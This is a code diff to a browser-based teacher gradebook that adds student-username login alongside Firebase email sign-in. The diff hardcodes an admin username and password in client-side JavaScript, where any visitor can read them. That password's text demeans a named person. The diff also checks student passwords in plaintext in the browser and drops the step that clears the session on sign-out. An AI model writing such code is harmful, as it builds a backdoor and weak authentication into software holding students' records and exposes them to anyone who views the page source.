@@ -110,9 +110,9 @@
 <div id="loginView">
   <form class="login-card" id="loginForm" autocomplete="off">
     <h1>Teacher Gradebook</h1>
-    <p>Sign in with your Firebase teacher email.</p>
-    <label for="lu">Teacher email</label>
-    <input id="lu" type="email" required autocomplete="email" autocapitalize="none" spellcheck="false">
+    <p>Sign in with your Firebase teacher email or student username.</p>
+    <label for="lu">Teacher email or student username</label>
+    <input id="lu" type="text" required autocomplete="off" autocapitalize="none" spellcheck="false">
     <label for="lp">Password</label>
     <input id="lp" type="password" required autocomplete="current-password">
     <div class="err" id="loginErr" role="alert"></div>
@@ -271,6 +271,8 @@
 
   const KEY = 'tdg_students_v1';
   const SESSION = 'tdg_session_v1';
+  const ADMIN_USER = 'fahadis3mk';
+  const ADMIN_PASS = 'Abdulmjeedismyslave';
 
   const $ = id => document.getElementById(id);
   const esc = s => String(s ?? '').replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
@@ -360,12 +362,10 @@
   }
 
   function showApp(){
-    const user = auth.currentUser;
     const v = lsGet(SESSION) || '';
+    const admin = !!auth.currentUser;
     const stu = currentStudent();
-    const admin = !!user;
-
-    if (v && !user && !stu) lsDel(SESSION);
+    if (v && !admin && !stu) lsDel(SESSION);
     $('loginView').hidden = admin || !!stu;
     $('appView').hidden = !admin;
     $('studentView').hidden = !stu;
@@ -375,22 +375,46 @@
 
   $('loginForm').addEventListener('submit', async e => {
     e.preventDefault();
-    const email = $('lu').value.trim();
-    const password = $('lp').value;
-    $('loginErr').textContent = '';
+    const u = $('lu').value.trim();
+    const p = $('lp').value;
+    const isEmail = /@/.test(u);
 
-    try {
-      await auth.signInWithEmailAndPassword(email, password);
-      lsSet(SESSION, email);
-      $('lp').value = '';
-      await loadRemoteStudents();
-      showApp();
-    } catch (error) {
-      const message = error && error.code === 'auth/invalid-credential'
-        ? 'Incorrect email or password.'
-        : (error && error.message) || 'Could not sign in.';
-      $('loginErr').textContent = message;
+    if (isEmail) {
+      try {
+        await auth.signInWithEmailAndPassword(u, p);
+        lsSet(SESSION, u);
+        $('loginErr').textContent = '';
+        $('lp').value = '';
+        await loadRemoteStudents();
+        showApp();
+        return;
+      } catch (error) {
+        const message = error && error.code === 'auth/invalid-credential'
+          ? 'Incorrect email or password.'
+          : (error && error.message) || 'Could not sign in.';
+        $('loginErr').textContent = message;
+        return;
+      }
     }
+
+    if (u === ADMIN_USER && p === ADMIN_PASS) {
+      lsSet(SESSION, '1');
+      $('loginErr').textContent = '';
+      $('lp').value = '';
+      showApp();
+      return;
+    }
+
+    const stu = students.find(s => s.username && s.username.toLowerCase() === u.toLowerCase() && s.password === p);
+    if (stu) {
+      lsSet(SESSION, 's:' + stu.id);
+      $('loginErr').textContent = '';
+      $('lp').value = '';
+      showApp();
+      return;
+    }
+
+    $('loginErr').textContent = 'Incorrect email or username/password.';
   });
 
   async function doLogout(){
@@ -649,8 +673,6 @@
   auth.onAuthStateChanged(user => {
     if (user) {
       lsSet(SESSION, user.email || user.uid);
-    } else {
-      lsDel(SESSION);
     }
     showApp();
     if (user) loadRemoteStudents();
